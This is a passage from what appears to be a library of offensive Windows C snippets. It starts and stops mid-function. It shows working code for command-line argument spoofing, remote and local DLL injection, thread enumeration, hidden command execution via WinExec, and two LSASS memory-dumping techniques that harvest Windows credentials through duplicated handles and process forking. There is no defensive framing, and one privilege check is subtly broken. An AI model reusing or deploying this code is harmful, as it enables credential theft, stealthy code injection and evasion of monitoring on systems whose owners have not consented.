		printf("[!] HeapAlloc [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadProcessMemory(pProcessInfo->hProcess, ProcessInfo.PebBaseAddress, pPeb, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Read %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = sizeof(RTL_USER_PROCESS_PARAMETERS) + (strlen(cProcessImgNameAndParms) * sizeof(CHAR)) + sizeof(CHAR);

	if (!(pUserProcessParms = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpReturnSize1))) {
		printf("[!] HeapAlloc [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadProcessMemory(pProcessInfo->hProcess, pPeb->ProcessParameters, pUserProcessParms, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Read %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = (wcslen(szMaliciousArgs) * sizeof(WCHAR)) + sizeof(WCHAR);

	if (!WriteProcessMemory(pProcessInfo->hProcess, pUserProcessParms->CommandLine.Buffer, (PVOID)szMaliciousArgs, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = 0x00;

	while (szMaliciousArgs[sTmpReturnSize1] != L'\0' && !iswspace(szMaliciousArgs[sTmpReturnSize1])) {
		sTmpReturnSize1++;
	}

	sTmpReturnSize1 = sTmpReturnSize1 * sizeof(WCHAR);

	if (!WriteProcessMemory(pProcessInfo->hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&sTmpReturnSize1, sizeof(DWORD), &sTmpReturnSize2) || sTmpReturnSize2 != sizeof(DWORD)) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sizeof(DWORD));
		goto _END_OF_FUNC;
	}

	if (ResumeThread(pProcessInfo->hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}


	bSTATE = TRUE;

_END_OF_FUNC:
	if (pcDuplicateStr)
		free(pcDuplicateStr);
	if (pPeb)
		HeapFree(GetProcessHeap(), 0x00, pPeb);
	if (pUserProcessParms)
		HeapFree(GetProcessHeap(), 0x00, pUserProcessParms);
	return bSTATE;
}
```
### Remote DLL Injection (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL InjectDllRemotelyW(IN HANDLE hProcess, IN LPWSTR szDllFilePath) {

	if (!hProcess || !szDllFilePath)
		return FALSE;

	LPVOID		pLoadLibraryW			= NULL;
	SIZE_T		sNumberOfBytesWritten	= NULL;
	LPVOID		pDllPathAddress			= NULL;
	DWORD		dwDllPathLength			= (lstrlenW(szDllFilePath) * sizeof(WCHAR)) + sizeof(WCHAR);

	if (!(pLoadLibraryW = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryW"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pDllPathAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pDllPathAddress, szDllFilePath, dwDllPathLength, &sNumberOfBytesWritten) || sNumberOfBytesWritten != dwDllPathLength) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, dwDllPathLength);
		return FALSE;
	}

	if (!CreateRemoteThread(hProcess, NULL, 0x00, pLoadLibraryW, pDllPathAddress, 0x00, NULL)) {
		printf("[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Argument Spoofing (Unicode)
```c
#include <windows.h>
#include <stdio.h>
#include <Winternl.h>

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL CreateArgsSpoofedProcessW(IN LPWSTR szProcessImgNameAndParms, IN LPCWSTR szMaliciousArgs, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!szProcessImgNameAndParms || !szMaliciousArgs || !pProcessInfo)
		return FALSE;

	BOOL							bSTATE						= FALSE;
	STARTUPINFOW					StartupInfo					= { 0 };
	PROCESS_BASIC_INFORMATION		ProcessInfo					= { 0 };
	PPEB							pPeb						= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParms			= NULL;
	fnNtQueryInformationProcess		pNtQueryInformationProcess	= NULL;
	DWORD							dwCreationFlags				= (CREATE_SUSPENDED);
	NTSTATUS						STATUS						= 0x00;
	SIZE_T							sTmpReturnSize1				= NULL,
									sTmpReturnSize2				= NULL;
	PWCHAR							pwcDuplicateStr				= NULL,
									pwcLastSlash				= NULL;

	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!(pwcDuplicateStr = _wcsdup(szProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pNtQueryInformationProcess = GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationProcess"))) {
		printf("[!] GetProcAddress Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pwcDuplicateStr, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQueryInformationProcess(pProcessInfo->hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(PROCESS_BASIC_INFORMATION), &sTmpReturnSize1)) != 0x00 || !ProcessInfo.PebBaseAddress) {
		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pPeb = (PPEB)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpReturnSize1))) {
		printf("[!] HeapAlloc [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadProcessMemory(pProcessInfo->hProcess, ProcessInfo.PebBaseAddress, pPeb, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Read %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = sizeof(RTL_USER_PROCESS_PARAMETERS) + (wcslen(szProcessImgNameAndParms) * sizeof(WCHAR)) + sizeof(WCHAR);

	if (!(pUserProcessParms = (PRTL_USER_PROCESS_PARAMETERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpReturnSize1))) {
		printf("[!] HeapAlloc [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadProcessMemory(pProcessInfo->hProcess, pPeb->ProcessParameters, pUserProcessParms, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Read %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = (wcslen(szMaliciousArgs) * sizeof(WCHAR)) + sizeof(WCHAR);

	if (!WriteProcessMemory(pProcessInfo->hProcess, pUserProcessParms->CommandLine.Buffer, (PVOID)szMaliciousArgs, sTmpReturnSize1, &sTmpReturnSize2) || sTmpReturnSize2 != sTmpReturnSize1) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sTmpReturnSize1);
		goto _END_OF_FUNC;
	}

	sTmpReturnSize1 = 0x00;

	while (szMaliciousArgs[sTmpReturnSize1] != L'\0' && !iswspace(szMaliciousArgs[sTmpReturnSize1])) {
		sTmpReturnSize1++;
	}

	sTmpReturnSize1 = sTmpReturnSize1 * sizeof(WCHAR);

	if (!WriteProcessMemory(pProcessInfo->hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&sTmpReturnSize1, sizeof(DWORD), &sTmpReturnSize2) || sTmpReturnSize2 != sizeof(DWORD)) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", (int)sTmpReturnSize2, (int)sizeof(DWORD));
		goto _END_OF_FUNC;
	}

	if (ResumeThread(pProcessInfo->hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}


	bSTATE = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (pPeb)
		HeapFree(GetProcessHeap(), 0x00, pPeb);
	if (pUserProcessParms)
		HeapFree(GetProcessHeap(), 0x00, pUserProcessParms);
	return bSTATE;
}
```
### Thread Enumeration Via NtQuerySystemInformation
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOL GetRemoteProcThreadViaNtQueryFunc(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT PDWORD pdwThreadID, OUT OPTIONAL PHANDLE phThread) {

	NTSTATUS						STATUS							= 0x00;
	fnNtQuerySystemInformation		pNtQuerySystemInformation		= NULL;
	WCHAR							wcUpperCaseProcName[MAX_PATH]	= { 0x00 };
	ULONG							uArrayLength					= 0x00;
	PSYSTEM_PROCESS_INFORMATION		pSystemProcInfo					= NULL;
	PBYTE							pTmpPntrVar						= NULL;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];
	}

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uArrayLength)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntrVar = pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength))) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcInfo, uArrayLength, NULL)))) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	while (pSystemProcInfo->NextEntryOffset) {

		WCHAR	szUprProcName[MAX_PATH]		= { 0x00 };

		if (!pSystemProcInfo->ImageName.Length || pSystemProcInfo->ImageName.Length >= MAX_PATH)
			goto _NEXT_ELEMENT;

		for (int i = 0; i < pSystemProcInfo->ImageName.Length; i++) {
			if (pSystemProcInfo->ImageName.Buffer[i] >= 'a' && pSystemProcInfo->ImageName.Buffer[i] <= 'z')
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i] - 'a' + 'A';
			else
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i];
		}

		if (wcscmp(wcUpperCaseProcName, szUprProcName) == 0x00) {

			*pdwProcessID	= (DWORD)pSystemProcInfo->UniqueProcessId;
			*pdwThreadID	= (DWORD)pSystemProcInfo->Threads[0].ClientId.UniqueThread;
			if (phThread)
				*phThread = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwThreadID);
			break;
		}

_NEXT_ELEMENT:
		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
	}

_END_OF_FUNC:
	if (pTmpPntrVar)
		HeapFree(GetProcessHeap(), 0x00, pTmpPntrVar);
	return (*pdwProcessID && *pdwThreadID) ? TRUE : FALSE;
}
```
### Local DLL Injection (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL InjectDllLocallyW(IN LPWSTR szDllFilePath, OUT OPTIONAL HMODULE* phModule) {

	if (!szDllFilePath)
		return FALSE;

	HMODULE hModule = NULL;

	if (!(hModule = LoadLibraryW(szDllFilePath))) {
		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (phModule)
		*phModule = hModule;

	return TRUE;
}
```
### Local DLL Injection (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL InjectDllLocallyA(IN LPSTR cDllFilePath, OUT OPTIONAL HMODULE* phModule) {

	if (!cDllFilePath)
		return FALSE;

	HMODULE hModule = NULL;

	if (!(hModule = LoadLibraryA(cDllFilePath))) {
		printf("[!] LoadLibraryA Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (phModule)
		*phModule = hModule;

	return TRUE;
}
```
### Execute Shell Command Via WinExec
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecuteCmdUsingWinExec(IN LPCSTR lpCommand) {

    UINT    uErr        = 0x00;

    if ((uErr = WinExec(lpCommand, SW_HIDE)) <= 31) {
        printf("[!] WinExec Failed With Error: %d\n", uErr);
        return FALSE;
    }

    return TRUE;
}
```
### LSASS Dump Via Duplication
```c
#include <windows.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>

#include "Structs.h"

#pragma comment (lib, "Dbghelp.lib")


// ==============================================================================================================================================================================================
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);
// ==============================================================================================================================================================================================


BOOL DuplicateLsassHandle(OUT HANDLE* phLsassProcess, IN DWORD dwLsassPid) {

	NTSTATUS							STATUS							= STATUS_SUCCESS;
	fnNtQuerySystemInformation			pNtQuerySystemInformation		= NULL;
	fnNtQueryObject						pNtQueryObject					= NULL;
	ULONG								uArrayLength					= 1024,
										uReturnLength					= NULL;
	PSYSTEM_HANDLE_INFORMATION			pSysHandleInfo					= NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION		pObjectTypeInfo					= NULL;
	HANDLE								hTmpProcessHandle				= NULL,
										hDuplicatedProcessHandle		= NULL;

	if (!phLsassProcess || !dwLsassPid)
		return FALSE;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pNtQueryObject = (fnNtQueryObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryObject"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, uArrayLength))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	while ((STATUS = pNtQuerySystemInformation(16, pSysHandleInfo, uArrayLength, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalReAlloc(pSysHandleInfo, uArrayLength *= 2, LMEM_MOVEABLE);

	for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {

		if (pSysHandleInfo->Handles[i].UniqueProcessId == dwLsassPid)
			continue;

		if (!(hTmpProcessHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pSysHandleInfo->Handles[i].UniqueProcessId)))
			continue;

		if (!DuplicateHandle(hTmpProcessHandle, pSysHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedProcessHandle, (PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS), FALSE, NULL)) {
			CloseHandle(hTmpProcessHandle);
			continue;
		}

		if (!(pObjectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)LocalAlloc(LPTR, 1024))) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			continue;
		}

		if ((STATUS = pNtQueryObject(hDuplicatedProcessHandle, ObjectTypeInformation, pObjectTypeInfo, 1024, &uReturnLength)) != STATUS_SUCCESS) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		if (wcscmp(L"Process", pObjectTypeInfo->TypeName.Buffer) != 0x00) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		if (GetProcessId(hDuplicatedProcessHandle) != dwLsassPid) {
			CloseHandle(hTmpProcessHandle);
			CloseHandle(hDuplicatedProcessHandle);
			LocalFree(pObjectTypeInfo);
			continue;
		}

		*phLsassProcess = hDuplicatedProcessHandle;
		CloseHandle(hTmpProcessHandle);
		LocalFree(pObjectTypeInfo);
		break;
	}

_END_OF_FUNC:
	if (pSysHandleInfo)
		LocalFree(pSysHandleInfo);
	if (*phLsassProcess)
		return TRUE;
	printf("[!] No Open Handles To Lsass.exe Was Detected !\n");
	return FALSE;
}

// ==============================================================================================================================================================================================

typedef struct _MINIDUMP_CALLBACK_PARM
{
	LPVOID		pDumpedBuffer;
	DWORD		dwDumpedBufferSize;

} MINIDUMP_CALLBACK_PARM, * PMINIDUMP_CALLBACK_PARM;


BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

	PMINIDUMP_CALLBACK_PARM		pMiniDumpParm	= (PMINIDUMP_CALLBACK_PARM)CallbackParam;
	LPVOID						pSource			= NULL,
								pDestination	= NULL;
	DWORD						dwBufferSize	= 0x00;

	switch (CallbackInput->CallbackType) {

		case IoStartCallback: {
			CallbackOutput->Status = S_FALSE;
			break;
		}

		case IoWriteAllCallback: {
			CallbackOutput->Status = S_OK;

			pSource			= CallbackInput->Io.Buffer;
			pDestination	= (LPVOID)((DWORD_PTR)pMiniDumpParm->pDumpedBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
			dwBufferSize	= CallbackInput->Io.BufferBytes;

			pMiniDumpParm->dwDumpedBufferSize += dwBufferSize;
			RtlCopyMemory(pDestination, pSource, dwBufferSize);

			break;
		}

		case IoFinishCallback: {
			CallbackOutput->Status = S_OK;
			break;
		}

		default: {
			return TRUE;
		}
	}

	return TRUE;
}

// ==============================================================================================================================================================================================

BOOL ForkRemoteProcess(IN OUT HANDLE* phLsassHandle) {

	NTSTATUS				STATUS					= STATUS_SUCCESS;
	fnNtCreateProcessEx		pNtCreateProcessEx		= NULL;

	if (!(pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateProcessEx"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if ((STATUS = pNtCreateProcessEx(phLsassHandle, (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), NULL, *phLsassHandle, 0x00, NULL, NULL, NULL, 0x00)) != STATUS_SUCCESS) {
		printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// ==============================================================================================================================================================================================

BOOL SetDebugPrivilege() {

	BOOL	            bResult					= FALSE;
	TOKEN_PRIVILEGES	TokenPrivs				= { 0x00 };
	LUID				Luid					= { 0x00 };
	HANDLE	            hCurrentTokenHandle		= NULL;

	if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
		printf("[!] OpenProcessToken Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid)) {
		printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	TokenPrivs.PrivilegeCount = 0x01;
	TokenPrivs.Privileges[0].Luid = Luid;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hCurrentTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hCurrentTokenHandle)
		CloseHandle(hCurrentTokenHandle);
	return bResult;
}

// ==============================================================================================================================================================================================


BOOL DumpLsassViaMiniDump(IN DWORD dwLsassProcessId) {

	BOOL							bResult					= FALSE;
	DWORD							dwNmbrOfBytesWritten	= 0x00;
	HANDLE							hLsassProcess			= NULL,
									hDumpFile				= INVALID_HANDLE_VALUE;
	MINIDUMP_CALLBACK_INFORMATION	MiniDumpInfo			= { 0x00 };
	MINIDUMP_CALLBACK_PARM			MiniDumpParm			= { 0x00 };

	RtlSecureZeroMemory(&MiniDumpInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	RtlSecureZeroMemory(&MiniDumpParm, sizeof(MINIDUMP_CALLBACK_PARM));

	if (!SetDebugPrivilege)
		return FALSE;

	printf("[i] Searching For An Opened Handle To Process Of PID: %d \n", dwLsassProcessId);

	if (!DuplicateLsassHandle(&hLsassProcess, dwLsassProcessId))
		goto _END_OF_FUNC;

	printf("[*] Opened An Duplicated Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (ForkRemoteProcess(&hLsassProcess))
		dwLsassProcessId = GetProcessId(hLsassProcess);
	else
		goto _END_OF_FUNC;

	printf("[+] Forked Lsass Process PID: %d\n", dwLsassProcessId);
	printf("[*] Opened An Forked Lsass.exe Handle: 0x%0.8X \n", hLsassProcess);

	if (!(MiniDumpParm.pDumpedBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	MiniDumpInfo.CallbackRoutine	= MinidumpCallbackRoutine;
	MiniDumpInfo.CallbackParam		= &MiniDumpParm;

	if (!MiniDumpWriteDump(hLsassProcess, 0x00, 0x00, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo)) {
		printf("[!] MiniDumpWriteDump Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hDumpFile = CreateFileA("DumpFile.dump", GENERIC_ALL, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!WriteFile(hDumpFile, MiniDumpParm.pDumpedBuffer, MiniDumpParm.dwDumpedBufferSize, &dwNmbrOfBytesWritten, NULL) || dwNmbrOfBytesWritten != MiniDumpParm.dwDumpedBufferSize) {
		printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes \n", dwNmbrOfBytesWritten, MiniDumpParm.dwDumpedBufferSize);
		goto _END_OF_FUNC;
	}

	printf("[*] Lsass Is Dumped Successfully !\n");

	bResult = TRUE;

_END_OF_FUNC:
	if (hLsassProcess)
		CloseHandle(hLsassProcess);
	if (hDumpFile)
		CloseHandle(hDumpFile);
	if (MiniDumpParm.pDumpedBuffer)
		HeapFree(GetProcessHeap(), 0x00, MiniDumpParm.pDumpedBuffer);
	return 0;
}
```
### LSASS Dump Via RtlReportSilentProcessExit
```c
#include <windows.h>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <stdio.h>

#include "Structs.h"

#pragma comment (lib, "Dbghelp.lib")


// ==============================================================================================================================================================================================
typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtQueryObject)(HANDLE Handle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);
typedef NTSTATUS(NTAPI* fnRtlReportSilentProcessExit)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
// ==============================================================================================================================================================================================


BOOL DuplicateLsassHandle(OUT HANDLE* phLsassProcess, IN DWORD dwLsassPid) {

	NTSTATUS							STATUS						= STATUS_SUCCESS;
	fnNtQuerySystemInformation			pNtQuerySystemInformation	= NULL;
	fnNtQueryObject						pNtQueryObject				= NULL;
	ULONG								uArrayLength				= 1024,
										uReturnLength				= NULL;
	PSYSTEM_HANDLE_INFORMATION			pSysHandleInfo				= NULL;
	PPUBLIC_OBJECT_TYPE_INFORMATION		pObjectTypeInfo				= NULL;
	HANDLE								hTmpProcessHandle			= NULL,
										hDuplicatedProcessHandle	= NULL;

	if (!phLsassProcess || !dwLsassPid)
		return FALSE;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pNtQueryObject = (fnNtQueryObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryObject"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}


	if (!(pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, uArrayLength))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	while ((STATUS = pNtQuerySystemInformation(16, pSysHandleInfo, uArrayLength, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalReAlloc(pSysHandleInfo, uArrayLength *= 2, LMEM_MOVEABLE);


	for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {

